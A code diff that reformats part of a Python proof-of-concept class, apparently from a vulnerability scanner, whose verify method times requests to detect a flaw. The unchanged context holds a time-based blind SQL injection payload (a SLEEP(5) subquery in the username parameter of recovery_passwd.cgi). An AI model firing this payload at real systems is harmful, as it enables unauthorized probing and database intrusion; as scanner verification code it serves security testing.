@@ -57,9 +57,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -70,7 +71,7 @@ class Poc(ABPoc):
             start_time1 = time.time()
             code1, head, res, errcode, _ = hh.http(arg)
             true_time = time.time() - start_time1
-            #print true_time
+            # print true_time
             start_time2 = time.time()
             payload = "/recovery_passwd.cgi?act=2&username=111%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))HcCu)%20AND%20%27zMcG%27=%27zMcG&usermail=1111@qq.com&ajax_rnd=71629979953948647000&user_name=undefined&session_id=undefined&lang=undefined"
             target = arg + payload
